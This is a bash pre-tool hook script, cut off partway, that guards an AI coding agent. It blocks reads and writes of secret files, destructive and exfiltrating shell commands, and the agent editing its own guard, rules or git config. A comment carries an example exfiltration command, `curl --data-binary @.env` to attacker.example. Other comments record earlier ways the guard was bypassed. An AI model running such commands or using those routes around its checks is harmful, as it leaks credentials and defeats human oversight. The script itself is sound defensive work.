#!/usr/bin/env bash
#
# pre-tool-guard.sh — PreToolUse hook (matchers: Bash|Write|Edit|MultiEdit|
# NotebookEdit, and mcp__*atlassian__* writes for the shadow gate). Mechanical
# enforcement of .claude/rules/core/security.md: blocks writes/reads-as-writes
# to secret files, the most destructive shell commands, and JIRA writes while
# Shadow Mode is on — regardless of how the request was framed upstream.
#
set -uo pipefail

INPUT="$(cat)"

get_json() {
  # get_json <python-expr-suffix-on-d> — reads the hook payload as `d`.
  command -v python3 >/dev/null 2>&1 || return 1
  printf '%s' "$INPUT" | python3 -c "
import json, sys
d = json.load(sys.stdin)
$1
" 2>/dev/null
}

TOOL_NAME="$(get_json 'print(d.get("tool_name") or "")')"
COMMAND="$(get_json 'print((d.get("tool_input") or {}).get("command") or "")')"
FILE_PATH="$(get_json 'print((d.get("tool_input") or {}).get("file_path") or "")')"
CWD="$(get_json 'print(d.get("cwd") or "")')"; CWD="${CWD:-$PWD}"
SESSION_CWD="$CWD"  # MCP config is harness-scoped (the session's cwd), NOT QA-home data — the foreign-MCP gate below reads .mcp.json from here

# QA home discovery (0.9.1, hardened 0.19.3 C3): the session may run in a
# subfolder of the QA home. Walk up and find the OUTERMOST marker below $HOME
# — not the nearest. A planted `.qa-home` + `.qa-guard.json` in a cloned
# product repo must NOT hijack the QA home. The outermost marker is the real
# home; inner markers are subfolders.
d="$CWD"
FOUND_QA_HOME=""
while : ; do
  if [ -e "$d/.qa-home" ] || { [ -d "$d/projects" ] && [ -d "$d/memory" ] && [ -d "$d/evidence" ]; }; then
    FOUND_QA_HOME="$d"  # keep updating — outermost wins
  fi
  if { [ -n "${HOME:-}" ] && [ "$d" = "$HOME" ]; } || [ "$d" = "/" ]; then break; fi
  d="$(dirname "$d")"
done
[ -n "$FOUND_QA_HOME" ] && CWD="$FOUND_QA_HOME"

block() {
  echo "BLOCKED by pre-tool-guard: $1" >&2
  exit 2
}

# secrets_read toggle (0.11.0, tdd §7): direct reads of secret files are a
# comfort opt-in decided by the QA home's .qa-guard.json (CWD is the resolved
# QA home at this point). Anything but the exact string "allow" — missing
# file, missing key, invalid JSON, any other value — keeps the default:
# block. Fail closed on every ambiguity.
SECRETS_READ="block"
GUARD_CFG="$CWD/.qa-guard.json"
if [ -f "$GUARD_CFG" ]; then
  if command -v python3 >/dev/null 2>&1; then
    SR="$(python3 - "$GUARD_CFG" <<'PY' 2>/dev/null
import json, sys
try:
    v = json.load(open(sys.argv[1])).get("secrets_read")
except Exception:
    v = None
print(v if isinstance(v, str) else "")
PY
)"
  else
    SR="$(sed -n 's/.*"secrets_read"[[:space:]]*:[[:space:]]*"\([a-zA-Z]*\)".*/\1/p' "$GUARD_CFG" | head -1)"
  fi
  [ "$SR" = "allow" ] && SECRETS_READ="allow"
fi

mcp_server_declared() { # <config-file> <server> — 0 if the file declares the server under mcpServers
  [ -f "$1" ] || return 1
  if command -v python3 >/dev/null 2>&1; then
    python3 - "$1" "$2" <<'PY' >/dev/null 2>&1
import json, sys
try:
    cfg = json.load(open(sys.argv[1]))
except Exception:
    sys.exit(1)
sys.exit(0 if sys.argv[2] in (cfg.get("mcpServers") or {}) else 1)
PY
  else
    grep -qE "\"$2\"[[:space:]]*:" "$1"
  fi
}

# --- fallback whenever the payload could not be parsed: scan the raw JSON with
# plain grep instead of silently allowing everything. This used to require
# python3 to be ABSENT, which meant a broken parse (python3 present, but the
# expression failing — as the escaped quotes here did until 2026-09-05) left
# TOOL_NAME/COMMAND/FILE_PATH empty and every check skipped, so the guard
# allowed `rm -rf`, force pushes and .env writes alike. Fail closed instead:
# no parse → match against the whole payload.
if [ -z "$TOOL_NAME" ]; then
  COMMAND="$INPUT"
  FILE_PATH="$INPUT"
  # An unparsable call that touches a secrets path is refused outright (the
  # anchored reader checks below cannot be trusted on a raw JSON blob), and an
  # unparsable call that looks like an Atlassian write is treated as one for
  # the shadow gate further down — fail safe on both axes.
  if printf '%s' "$INPUT" | sed 's/\.env\.example//g' | grep -qiE '\.env(\.|"|'"'"'|$)|\.pem|id_rsa|id_ed25519|secret|credential|\.auth|storage.state'; then
    block "refusing an unrecognized call touching a secrets path — failing closed."
  fi
  if printf '%s' "$INPUT" | grep -qiE 'atlassian__?(jira_)?(create|edit|add|transition|update|delete|executeWrite|executeDestructive)'; then
    # Single underscore before `atlassian` — the shadow-gate regex expects the
    # namespace prefix to end in one `_` (the real plugin naming shape), and the
    # sentinel must pass through that gate to be blocked there.
    TOOL_NAME="mcp__unparsed_atlassian__create"
  fi
fi

is_secret_path() {
  # Lowercase the path for the substring patterns below: bash `case` is
  # case-sensitive, so `*secrets*` alone never matched `SECRET/` or `Credentials`
  # — while product-layer.md told users this pattern protected them.
  local lc
  lc="$(printf '%s' "$1" | tr '[:upper:]' '[:lower:]')"
  case "$lc" in
    # `.env.example` is the committed placeholder template: no values, whitelisted
    # in .gitignore/.claudeignore, and the source install.sh copies `.env` from —
    # so the blueprint must be able to create and maintain it. Listed FIRST so it
    # wins over the `.env.*` pattern below. `.env.playwright-secrets` still
    # matches *secrets* and stays blocked, as does `.env` itself.
    *.env.example|*/.env.example) return 1 ;;
    *.env|*.env.*|*/.env|*/.env.*) return 0 ;;
    *.pem|*id_rsa*|*id_ed25519*) return 0 ;;
    *.auth|*storage-state*|*storage_state*) return 0 ;;
  esac
  case "$lc" in
    *secret*|*credential*) return 0 ;;
  esac
  return 1
}

# 1. Never write/edit a secrets file.
if [ -n "$FILE_PATH" ] && is_secret_path "$FILE_PATH"; then
  block "refusing to write/edit a secrets file ($FILE_PATH). Secrets are vault/env references only — see .claude/rules/core/security.md."
fi

# 0.19.3: path normalization — collapse //, strip /./, lowercase for case-
# insensitive filesystems (macOS). Applied before ALL pattern matching so
# .QA-GUARD.JSON, .claude/./settings.json, .claude//settings.json cannot
# bypass the protected-file checks (audit findings F1/F2).
normalize_path() {
  printf '%s' "$1" | sed -e 's://*:/:g' -e 's:/\./:/:g' -e 's:/$::' | tr '[:upper:]' '[:lower:]'
}

# 0.19.3 C1+H5+H8: human-only file classes — the agent must never write these.
# Covers: guard config (1b), project config (1c), harness config (H1), and the
# NEW classes: hook scripts, rules, skills, agents, scripts, and .git/ (C1/H8).
# An agent that can rewrite its own guard/rules/skills/agents has total
# self-escalation. All checks use the normalized path.
HUMAN_ONLY='(\.qa-guard\.json|project\.md|product\.md|settings\.json|settings\.local\.json|hooks\.json|\.claude-plugin/|hooks/.*\.sh|rules/.*\.md|skills/.*/skill\.md|skills/.*/references/|skills/.*/templates/|agents/.*\.md|scripts/.*\.(py|sh|mjs)|\.git/(hooks|config|info)/|\.git/config|\.preflight/|\.audit/)'
if [ -n "$FILE_PATH" ]; then
  NORM_FP="$(normalize_path "$FILE_PATH")"
  if printf '%s' "$NORM_FP" | grep -qE "$HUMAN_ONLY"; then
    block "refusing to write to a human-only file ($FILE_PATH) — the guard's config, hook scripts, rules, skills, agents, scripts, project config, and .git/ internals are human tasks. An agent that can edit these can disable its own guard, override safety rules, or plant persistent backdoors. Modify these files yourself or use the installer."
  fi
fi

# 0.19.3 C2: Write-then-Bash script indirection — a script written via Write
# and executed via Bash moves sensitive strings out of the guard's command
# check. Scan Write/Edit content to executable paths (.sh, .py, .mjs, shebang)
# for secret-access patterns before the write lands.
if [ -n "$FILE_PATH" ] && printf '%s' "$FILE_PATH" | grep -qiE '\.(sh|py|mjs|bash|zsh)$|(^|/)(Makefile)$'; then
  SCRIPT_CONTENT="$(get_json 'import re; ti=d.get("tool_input") or {}; parts=[]; [parts.append(str(v)) for v in [ti.get("content"), ti.get("new_string")] if v]; [parts.append(str(e.get("new_string",""))) for e in (ti.get("edits") or [])]; blob=" ".join(parts); print("yes" if re.search(r"(\.env|id_rsa|id_ed25519|\.pem\b|\.auth\b|storage[._-]state|\.qa-guard\.json|settings\.json|PROJECT\.md|shadow.*mode|secrets_read)", blob, re.IGNORECASE) else "")')"
  if [ "$SCRIPT_CONTENT" = "yes" ]; then
    block "refusing to write a script that references secret paths or protected config ($FILE_PATH) — Write-then-Bash is the same as a direct read/write. Inline the content in a Bash command instead so the guard can evaluate it."
  fi
fi

# 1d. Raw evidence stays out of the model context: screenshots, traces, videos,
# archives and the raw MCP output dir are evidence files, not reading material.
# This check works in every install mode — the permission denylist in
# .claude/settings.json covers integrate/shared, but plugin mode ships only
# hooks, so the guard is the universal enforcement.
if [ "$TOOL_NAME" = "Read" ] && [ -n "$FILE_PATH" ]; then
  case "$FILE_PATH" in
    *.png|*.jpg|*.jpeg|*.gif|*.webp|*.bmp|*.webm|*.mp4|*.mov|*.zip|*.har|*.mcp-out|*/.mcp-out/*|*/.mcp-out)
      block "refusing to read raw evidence ($FILE_PATH) — screenshots, traces, videos and archives stay as evidence files. Read execution_summary.json or curated JSON/Markdown instead." ;;
  esac
fi

# 1e. Read tool calls to secret files follow the same policy as Bash readers.
if [ "$TOOL_NAME" = "Read" ] && [ -n "$FILE_PATH" ]; then
  is_secret_path "$FILE_PATH" && case "$FILE_PATH" in
    *.env.example|*/.env.example) : ;;
    *.env|*.env.*|*/.env|*/.env.*)
      [ "$SECRETS_READ" != "allow" ] && block "refusing to read a .env* file — secrets never enter chat or context by default. Direct reads are a comfort opt-in: secrets_read=allow in .qa-guard.json (a human task)." ;;
    *)
      block "refusing to read a credential file — private keys, auth tokens and storage state never enter chat or context (blocked regardless of secrets_read)." ;;
  esac
fi

# 1f (0.19.4 H2): Grep/Glob can read secret files without hitting the Read
# guard. Check the search path and pattern for secret references.
if [ "$TOOL_NAME" = "Grep" ] || [ "$TOOL_NAME" = "Glob" ]; then
  GREP_TARGETS="$(get_json 'import json; ti=d.get("tool_input") or {}; parts=[str(ti.get(k,"")) for k in ["path","include","pattern","glob"]]; print(" ".join(parts))')"
  if printf '%s' "$GREP_TARGETS" | grep -qiE '\.env|id_rsa|id_ed25519|\.pem\b|\.auth\b|storage[._-]state|secret|credential'; then
    block "refusing to search in secret files or paths — secrets never enter chat or context. Use resolve-secrets.sh --status to check which keys exist."
  fi
fi

# 1g (0.19.4 H2): WebFetch can exfiltrate data via URL query strings. Block
# URLs that appear to carry secret values, and require human approval for
# non-stage/JIRA hosts when the agent has been reading secrets.
if [ "$TOOL_NAME" = "WebFetch" ]; then
  WEB_URL="$(get_json 'print((d.get("tool_input") or {}).get("url") or "")')"
  if printf '%s' "$WEB_URL" | grep -qiE '\.env|id_rsa|password|secret|token|credential|key='; then
    block "refusing to fetch a URL that appears to carry secrets — exfiltration of credentials is never allowed."
  fi
fi
if [ "$TOOL_NAME" = "Bash" ] || { [ -z "$TOOL_NAME" ] && [ -n "$COMMAND" ]; }; then
  # rm hardening (0.11.0, 0.18.5 H4): block rm with recursive+force flags in
  # any form — combined (`-rf`, `-Rf`, `-fr`, `-Fr`), split (`-r -f`), long
  # (`--recursive --force`). The flag cluster is scanned before the first
  # non-flag operand.
  if printf '%s' "$COMMAND" | grep -qiE 'rm[[:space:]]+((-[^[:space:]]+[[:space:]]+)*(-[a-zA-Z]*[rR][a-zA-Z]*|--recursive)([^[:space:]]*[[:space:]]+|$))' \
    && printf '%s' "$COMMAND" | grep -qiE 'rm[[:space:]]+((-[^[:space:]]+[[:space:]]+)*(-[a-zA-Z]*f[a-zA-Z]*|--force)([^[:space:]]*[[:space:]]+|$))'; then
    block "refusing rm -rf / rm -Rf / rm --recursive --force — destructive command."
  fi
  if printf '%s' "$COMMAND" | grep -qE 'git[[:space:]]+push[[:space:]]+.*(--force|-f\b)'; then
    block "refusing git push --force — see the git safety protocol before overriding this manually."
  fi
  # The two .env checks below run against a copy with the literal string
  # ".env.example" removed — that template carries no values (see is_secret_path)
  # and must stay writable, e.g. `cat > .env.example`. Only that exact substring
  # is stripped, so `.env`, `.env.local` and `.env.playwright-secrets` still match
  # in full. Destructive-command checks above deliberately use the raw command.
  # The tail pattern covers every unambiguous secret-file class: .env*,
  # *.pem, id_rsa, id_ed25519, *.auth and storage-state. The broad
  # *secret*/*credential* substring patterns from is_secret_path stay
  # WRITE-only — as a reader regex they would block ordinary grep/cat on
  # files whose names merely contain those words.
  COMMAND_NO_EXAMPLE="$(printf '%s' "$COMMAND" | sed 's/\.env\.example//gi')"
  ENV_TAIL='(\.[eE][nN][vV]([^a-zA-Z]|$))'
  HARD_SECRET_TAIL='(\.[pP][eE][mM]\b|id_rsa|id_ed25519|\.[aA][uU][tT][hH]\b|[sS][tT][oO][rR][aA][gG][eE][._-][sS][tT][aA][tT][eE])'
  SECRET_TAIL="($ENV_TAIL|$HARD_SECRET_TAIL)"

  # The toggle file via shell: sed -i/tee/redirects/cp/mv/rm on .qa-guard.json
  # are the same self-escalation as a Write to it (check 1b).
  if printf '%s' "$COMMAND" | grep -qE '(sed[[:space:]]+(-[a-zA-Z]*i[a-zA-Z.]*|--in-place)|tee[[:space:]]|>>?|cp[[:space:]]|mv[[:space:]]|rm[[:space:]]|truncate|dd[[:space:]])[^;&|]*\.qa-guard\.json'; then
    block "refusing to modify .qa-guard.json — the guard's own toggle is a human task (an agent that can edit it can grant itself secrets_read=allow)."
  fi
  # Interpreter one-liners that WRITE .qa-guard.json: same self-escalation,
  # different mechanism. python3 -c "open('.qa-guard.json','w')...", node -e
  # "require('fs').writeFileSync('.qa-guard.json',...)", etc. The open/write/
  # writeFile keyword is required so `python3 -c "note='.qa-guard.json'"` —
  # merely mentioning the name — stays allowed.
  if printf '%s' "$COMMAND" | grep -qiE '(python3?|perl|ruby|node|php)[[:space:]][^;&|]*(open|write|writeFile|require|include|slurp)[^;&|]*\.qa-guard\.json'; then
    block "refusing to modify .qa-guard.json via an interpreter — the guard's own toggle is a human task (an agent that can edit it can grant itself secrets_read=allow)."
  fi

  # H2 (0.18.5, hardened 0.19.2): shadow-mode unlock via Bash writers on
  # PROJECT.md — same self-escalation as the Write/Edit check 1c. Blocks ALL
  # Bash writes to PROJECT.md (sed -i, tee, redirect, cp, mv, truncate, dd):
  # a Bash write that modifies "Shadow mode: on" to "off" (e.g. `sed -i
  # s/on/off/`) does not contain "shadow" or "off" as words, so the old
  # word-based check was bypassable. PROJECT.md is a human-edited config
  # file — agents have no legitimate reason to write it via Bash.
  if printf '%s' "$COMMAND" | grep -qiE '(sed[[:space:]]+(-[a-zA-Z]*i[a-zA-Z.]*|--in-place)|tee[[:space:]]|>>?|cp[[:space:]]|mv[[:space:]]|truncate|dd[[:space:]]|install[[:space:]]|rsync[[:space:]]|ed[[:space:]])[^;&|]*PROJECT\.md'; then
    block "refusing to modify PROJECT.md via Bash — PROJECT.md is a human-edited config file (the shadow-mode unlock, product routing and project config are human tasks). Edit it yourself or use the Write/Edit tools with human approval."
  fi

  # rm hardening (0.11.0, tdd §9/F2): deleting a secrets file is a human
  # task. Plain `rm <.env*>` (and rm -f) used to sail through — only rm -rf
  # was blocked. Blocked regardless of the secrets_read toggle.
  if printf '%s' "$COMMAND_NO_EXAMPLE" | grep -qE "(^|[;&|(]|&&|\|\|)[[:space:]]*rm[[:space:]]+(-[a-zA-Z]+[[:space:]]+)*[^;&|]*$SECRET_TAIL"; then
    block "refusing to delete a secret file — removing a secret file is a human task (blocked regardless of secrets_read)."
  fi

  # cp/mv are NOT readers (tdd §8/F1): they relocate the secrets file out of
  # its protected context. Blocked in BOTH toggle states.
  if printf '%s' "$COMMAND_NO_EXAMPLE" | grep -qE "(^|[;&|(]|&&|\|\|)[[:space:]]*(cp|mv)[[:space:]]+[^;&|]*$SECRET_TAIL"; then
    block "refusing to copy/move a secret file — secrets never leave their protected file (blocked regardless of secrets_read)."
  fi

  # H4 (0.18.5, hardened 0.19.2): additional mutating commands that destroy/
  # overwrite/symlink secret files — tee, truncate, dd, find -delete, install,
  # shred, ln (symlink attack). Previously only rm/cp/mv/sed -i were covered.
  if printf '%s' "$COMMAND_NO_EXAMPLE" | grep -qE "(^|[;&|(]|&&|\|\|)[[:space:]]*(tee|truncate|dd|install|shred|ln)[[:space:]][^;&|]*$SECRET_TAIL"; then
    block "refusing to write/destroy a secret file — secret files are never overwritten or truncated (blocked regardless of secrets_read)."
  fi
  if printf '%s' "$COMMAND_NO_EXAMPLE" | grep -qE "find[[:space:]][^;&|]*-delete[^;&|]*$SECRET_TAIL|find[[:space:]][^;&|]*$SECRET_TAIL[^;&|]*-delete"; then
    block "refusing to delete a secret file via find -delete — removing a secret file is a human task (blocked regardless of secrets_read)."
  fi
  # M3 (0.19.6): git-based exfiltration — git add/commit/stash/archive with
  # a secret file stages it into the repository (and potentially pushes it).
  if printf '%s' "$COMMAND_NO_EXAMPLE" | grep -qE 'git[[:space:]]+(add|commit|stash|archive)[[:space:]][^;&|]*$SECRET_TAIL'; then
    block "refusing to stage/commit a secret file — git add/commit/stash/archive with a secret path puts credentials into the repository (blocked regardless of secrets_read)."
  fi

  # sed -i / awk -i edit in place — a WRITE, not a read (tdd §8/F1). The flag
  # must sit directly after the command: `-i`, `-i.bak`, `--in-place`,
  # `-i inplace`. A -i *string* inside the sed script is a rare accepted
  # false positive (fail closed beats a write slipping through as a "read").
  if printf '%s' "$COMMAND_NO_EXAMPLE" | grep -qE "(^|[;&|(]|&&|\|\|)[[:space:]]*(sed|awk)[[:space:]]+(-[a-zA-Z]*i[a-zA-Z.]*|--in-place)[[:space:]][^;&|]*$SECRET_TAIL"; then
    block "refusing an in-place edit of a secret file — sed -i / awk -i is a write, not a read (blocked regardless of secrets_read)."
  fi

  # The reader has to sit at a COMMAND position (line start, or after ; && || |) and
  # the secrets file has to belong to THAT command's arguments — hence [^;&|]*
  # instead of .*. The previous pattern matched the filename anywhere later in the
  # line, so a harmless pipe into a pager followed by an unrelated echo mentioning
  # the file name in prose was blocked. A guard that blocks ordinary work gets
  # switched off, and then it protects nothing at all.
  # grep/sed/awk/jq are readers too — a field agent demonstrated `grep -o '^[A-Z_]*='
  # .env.playwright-secrets` sailing through the old list (0.6.1 field report).
  # Listing key NAMES is exactly what resolve-secrets.sh --status exists for.
  # 0.11.0: this READER_CORE class (cp/mv and * -i split out above) follows the
  # secrets_read toggle in .qa-guard.json — default stays block.
  # 0.18.5 C1: reader list extended (cut/tac/xxd/nl/paste/od/strings/sort/diff/
  # tar/zip/unzip/dd/hexdump/column/rev/tr/fmt/fold/comm/join/uniq/wc/shred),
  # wrapper prefixes added (sudo/env/nice/time/exec/command/eval/source/doas),
  # and xargs treated as a reader (it reads stdin). The wrapper group allows
  # `sudo cat .env`, `env cat .env`, `sudo -u root cat .env` etc. The bash/sh/
  # zsh/dash group is handled separately below (subshell -c).
  READER_CORE='(cat|less|more|head|tail|grep|sed|awk|jq|source|\.|base64|cut|tac|xxd|nl|paste|od|strings|sort|diff|tar|zip|unzip|dd|hexdump|column|rev|tr|fmt|fold|comm|join|uniq|wc|shred|xargs|split|csplit)'
  WRAPPER_PREFIX='((sudo|env|nice|time|exec|command|eval|doas)[[:space:]]+(-[a-zA-Z]+[[:space:]]+)*)*'
  if [ "$SECRETS_READ" != "allow" ] && printf '%s' "$COMMAND_NO_EXAMPLE" | grep -qiE "(^|[;&|(]|&&|\|\|)[[:space:]]*${WRAPPER_PREFIX}${READER_CORE}[[:space:]]+[^;&|]*$ENV_TAIL"; then
    block "refusing a command that reads a .env* file — secrets never enter chat or context by default. To check which keys exist: resolve-secrets.sh --status. Direct reads are a comfort opt-in: secrets_read=allow in .qa-guard.json (a human task — the guard refuses edits to it)."
  fi
  # Hard secret classes (private keys, auth tokens, storage state) are NEVER
  # readable, regardless of the secrets_read toggle — they are not a comfort
  # opt-in, they are credentials.
  if printf '%s' "$COMMAND_NO_EXAMPLE" | grep -qE "(^|[;&|(]|&&|\|\|)[[:space:]]*${WRAPPER_PREFIX}${READER_CORE}[[:space:]]+[^;&|]*$HARD_SECRET_TAIL"; then
    block "refusing a command that reads a credential file — private keys, auth tokens and storage state never enter chat or context (blocked regardless of secrets_read)."
  fi
  # Subshell execution (`bash -c 'cat .env'`, `sh -c "head .env"`, etc.): the
  # inner command string may reference a secret path. Conservative: if the
  # command invokes a shell with -c and a secret path appears anywhere in the
  # same command segment, block it — a subshell that touches a secret path is
  # a read attempt in every realistic framing.
  if printf '%s' "$COMMAND_NO_EXAMPLE" | grep -qiE "(^|[;&|(]|&&|\|\|)[[:space:]]*(bash|sh|zsh|dash)[[:space:]]+-c[[:space:]]" \
    && printf '%s' "$COMMAND_NO_EXAMPLE" | grep -qE "$SECRET_TAIL"; then
    block "refusing a subshell that touches a secret file — bash -c / sh -c with a secret path in the command string is a read attempt (blocked regardless of secrets_read)."
  fi
  # M4 (0.19.5): find -exec and git show/cat-file/log read secret files
  # without a reader verb at command position.
  if printf '%s' "$COMMAND_NO_EXAMPLE" | grep -qiE 'find[[:space:]][^;&|]*(-exec|-print0|[^;&|]*)[^;&|]*$SECRET_TAIL'; then
    block "refusing to use find with a secret file — find -exec/-print0 can read secret content (blocked regardless of secrets_read)."
  fi
  if printf '%s' "$COMMAND_NO_EXAMPLE" | grep -qiE 'git[[:space:]]+(show|cat-file|grep|log|diff)[[:space:]][^;&|]*$SECRET_TAIL'; then
    block "refusing to read a secret file via git — git show/cat-file/log can extract file content from history (blocked regardless of secrets_read)."
  fi
  # The next-most-likely bypass class: interpreter one-liners that OPEN the
  # file (python3 -c "print(open('.env').read())" et al.). The open/read/load
  # keyword is required, so `python3 -c "note='.env template'"` — merely
  # MENTIONING the name in a string — stays allowed (audit 2026-09-18, F4:
  # the false-positive rate must stay visible in fixtures). A regex guard can
  # never enumerate every way to read a file — this is a best-effort net; the
  # real guarantee is --secrets masking at the browser layer
  # (docs/rules/core/security.md).
  # This class does NOT follow the toggle (tdd §10/§11): a regex cannot tell
  # open('.env') from open('.env','w') — allowing it in allow-mode would open
  # a secret-WRITE hole, so it fails closed in both states.
  if printf '%s' "$COMMAND_NO_EXAMPLE" | grep -qE "(python3?|perl|ruby|node|php)[[:space:]][^;&|]*(open|read|load|require|include|slurp|file_get_contents|fread|fgets|file\()[^;&|]*$SECRET_TAIL"; then
    block "refusing a command that appears to read a secret file via an interpreter — interpreter payloads cannot be classified read-vs-write reliably, so this class stays blocked even with secrets_read=allow. To check which keys exist: resolve-secrets.sh --status."
  fi
  if printf '%s' "$COMMAND_NO_EXAMPLE" | grep -qE ">>?[[:space:]]*$SECRET_TAIL"; then
    block "refusing a command that writes into a secret file directly — use the vault/secrets workflow instead."
  fi
  # A `<` redirect FROM a secret file is a read (e.g. `xargs cat < .env`).
  if printf '%s' "$COMMAND_NO_EXAMPLE" | grep -qE "<[[:space:]]*$SECRET_TAIL"; then
    block "refusing a command that redirects a secret file as stdin — that is a read (blocked regardless of secrets_read)."
  fi
  # Exfiltration: network clients referencing a secret path are blocked
  # unconditionally. `curl --data-binary @.env https://attacker.example/…`
  # is the canonical exfiltration vector; `wget --post-file=.env`, `nc`,
  # `scp`, `rsync` are the same class. This is the one place where the
  # secret path must be in the same command segment as the network client.
  if printf '%s' "$COMMAND_NO_EXAMPLE" | grep -qiE "(^|[;&|(]|&&|\|\|)[[:space:]]*(curl|wget|nc|netcat|ftp|scp|sftp|rsync|ssh)[[:space:]]" \
    && printf '%s' "$COMMAND_NO_EXAMPLE" | grep -qE "$SECRET_TAIL"; then
    block "refusing a network command that references a secret file — exfiltration of credentials is never allowed (blocked regardless of secrets_read)."
  fi

  # S3: Bash curl/wget to JIRA REST endpoints with a write method bypasses the
  # MCP-level shadow gate and the JIRA write audit. Block the same class of
  # write the MCP gate handles (create/edit/add/transition/update/delete).
  # 0.18.5 H3: extended to cover `curl -T` (implicit PUT upload), `http`/`httpie`
  # (HTTPie method syntax: `http POST URL`), and interpreter-based HTTP writes.
  if printf '%s' "$COMMAND" | grep -qE '(curl|wget|http|httpie)[[:space:]]' \
    && printf '%s' "$COMMAND" | grep -qiE '(-X[[:space:]]*(POST|PUT|DELETE|PATCH)|--request[[:space:]]*(POST|PUT|DELETE|PATCH)|-d[[:space:]]|--data[=[:space:]]|--data-raw[=[:space:]]|--data-urlencode[=[:space:]]|--json[=[:space:]]|-F[[:space:]]|--form[=[:space:]]|--post-data[=[:space:]]|--post-file[=[:space:]]|--upload-file[=[:space:]]|-T[[:space:]]|--method[=:]*(POST|PUT|DELETE|PATCH)|(curl|wget|http|httpie)[[:space:]]+(POST|PUT|DELETE|PATCH)[[:space:]])' \
    && printf '%s' "$COMMAND" | grep -qE '/rest/(api|agile)/'; then
    block "refusing a Bash JIRA REST write (curl/wget/http with a write method to /rest/api/ or /rest/agile/) — JIRA writes go through the Atlassian MCP tools so the shadow gate and write audit apply. Read-only GET requests stay allowed."
  fi
  # Interpreter-based JIRA REST writes: python/node/perl/ruby making HTTP
  # POST/PUT/DELETE/PATCH to a JIRA REST endpoint. Conservative: any interpreter
  # with an HTTP write method + REST URL is blocked.
  if printf '%s' "$COMMAND" | grep -qiE '(python3?|perl|ruby|node|php)[[:space:]]' \
    && printf '%s' "$COMMAND" | grep -qiE '(requests\.(post|put|patch|delete)|urlopen|\.post\(|\.put\(|\.patch\(|\.delete\(|fetch\()' \
    && printf '%s' "$COMMAND" | grep -qE '/rest/(api|agile)/'; then
    block "refusing an interpreter-based JIRA REST write (python/node/perl/ruby HTTP write to /rest/api/ or /rest/agile/) — JIRA writes go through the Atlassian MCP tools so the shadow gate and write audit apply. Read-only requests stay allowed."
  fi

  # S3b: Git hosting REST API writes bypass `git push` (field report: a
  # GitLab Commits API push was invisible to the git-level guard). Block
  # curl/wget/http writes to GitHub/GitLab/Bitbucket API endpoints for
  # repository mutations (commits, refs, branches, trees, releases).
  # Read-only GET requests stay allowed.
  if printf '%s' "$COMMAND" | grep -qE '(curl|wget|http|httpie)[[:space:]]' \
    && printf '%s' "$COMMAND" | grep -qiE '(-X[[:space:]]*(POST|PUT|DELETE|PATCH)|--request[[:space:]]*(POST|PUT|DELETE|PATCH)|-d[[:space:]]|--data[=[:space:]]|--data-raw[=[:space:]]|--json[=[:space:]]|--upload-file[=[:space:]]|--post-file[=[:space:]]|--post-data[=[:space:]]|-T[[:space:]]|--method[=:]*(POST|PUT|DELETE|PATCH))' \
    && printf '%s' "$COMMAND" | grep -qiE '(api\.github\.com|github\.com/api|gitlab\.com/api|api\.gitlab|bitbucket\.org/api|api\.bitbucket|/api/v4/projects|/api/v3/repos|/repos/.*/(commits|git/refs|branches|releases|trees|contents))'; then
    block "refusing a git hosting REST write (curl/wget/http with a write method to a GitHub/GitLab/Bitbucket API endpoint) — code changes go through git so the safety protocol applies. Read-only GET requests stay allowed."
  fi
  # Interpreter-based git hosting API writes: python/node/perl/ruby.
  if printf '%s' "$COMMAND" | grep -qiE '(python3?|perl|ruby|node|php)[[:space:]]' \
    && printf '%s' "$COMMAND" | grep -qiE '(requests\.(post|put|patch|delete)|urlopen|\.post\(|\.put\(|\.patch\(|\.delete\(|fetch\()' \
    && printf '%s' "$COMMAND" | grep -qiE '(api\.github\.com|github\.com/api|gitlab\.com/api|api\.gitlab|bitbucket\.org/api|api\.bitbucket|/api/v4/projects|/api/v3/repos|/repos/.*/(commits|git/refs|branches|releases|trees|contents))'; then
    block "refusing an interpreter-based git hosting REST write (python/node/perl/ruby HTTP write to a GitHub/GitLab/Bitbucket API endpoint) — code changes go through git so the safety protocol applies."
  fi
fi

# 2b. MCP config stays project-scoped (field report 2026-09-22: a GLOBAL
# gitlab MCP server pointed at a different customer's .env — the agent nearly
# edited it, saved only by the secrets guard above). Another project's
# config/data is never used or touched here, by design: (a) the agent never
# writes global MCP config (~/.claude.json, ~/.config/opencode/opencode.json*)
# — global edits are a human task; (b) a call to an MCP server that exists
# only in global config is blocked until the human declares the server in the
# project's own .mcp.json.
if [ "${QA_ALLOW_GLOBAL_MCP:-0}" != "1" ]; then
  case "$TOOL_NAME" in
    Write|Edit|MultiEdit|NotebookEdit)
      case "$FILE_PATH" in
        "$HOME/.claude.json"|"$HOME/.config/opencode/opencode.json"|"$HOME/.config/opencode/opencode.jsonc")
          block "refusing to modify global MCP config ($FILE_PATH) — MCP config is project-scoped here: a project's servers live in its own .mcp.json / opencode.json, never in global config (~/.claude.json, ~/.config/opencode). Another project's data is never used or touched — global config edits are a human task. Escape hatch: QA_ALLOW_GLOBAL_MCP=1." ;;
      esac ;;
    Bash)
      if printf '%s' "$COMMAND" | grep -qE '(sed[[:space:]]+-i|tee[[:space:]]|>>?|cp[[:space:]]|mv[[:space:]]|rm[[:space:]]|truncate|dd[[:space:]])[^;&|]*(\.claude\.json|\.config/opencode/opencode\.jsonc?)'; then
        FILE_PATH="the command line"
        block "refusing to modify global MCP config ($FILE_PATH) — MCP config is project-scoped here: a project's servers live in its own .mcp.json / opencode.json, never in global config (~/.claude.json, ~/.config/opencode). Another project's data is never used or touched — global config edits are a human task. Escape hatch: QA_ALLOW_GLOBAL_MCP=1."
      fi
      # 0.19.3 H8: git config mutations are human-only (core.sshCommand,
      # core.hooksPath, remote.* = persistent RCE / redirect vectors)
      if printf '%s' "$COMMAND" | grep -qE 'git[[:space:]]+config[[:space:]]+[^[:space:]]+[[:space:]]+[^[:space:]]'; then
        FILE_PATH="the command line"
        block "refusing to modify git config ($FILE_PATH) — git config (core.sshCommand, core.hooksPath, remote.*, etc.) is a human task. An agent that can change git config can plant persistent backdoors or redirect pushes."
      fi
      # 0.19.3 H8: git apply/checkout/restore/reset/stash are human-only
      if printf '%s' "$COMMAND" | grep -qE 'git[[:space:]]+(apply|checkout|restore|reset|stash)([[:space:]]|$)'; then
        FILE_PATH="the command line"
        block "refusing to modify files via git ($FILE_PATH) — git apply/checkout/restore/reset/stash can overwrite protected files. Use the Write/Edit tools for individual file changes."
      fi
      # 0.19.3 C1+H8: expanded Bash-writer check for human-only files
